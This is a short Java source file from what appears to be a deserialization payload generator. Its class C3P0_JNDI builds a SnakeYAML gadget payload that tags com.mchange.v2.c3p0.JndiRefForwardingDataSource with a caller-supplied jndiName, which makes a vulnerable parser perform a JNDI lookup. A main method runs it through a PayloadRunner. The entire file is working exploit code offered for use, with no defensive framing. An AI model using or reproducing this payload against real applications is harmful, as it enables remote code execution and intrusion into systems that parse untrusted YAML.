package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;

public class C3P0_JNDI implements ObjectPayload<Object> {

    @Override
    public Object getObject(final String command) throws Exception {
        String yamlPayload = String.format("!!com.mchange.v2.c3p0.JndiRefForwardingDataSource \n" +
            " \"jndiName\": \"%s\"\n" +
            " \"loginTimeout\": 0",command);
        return yamlPayload;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(C3P0_JNDI.class, args);
    }
}
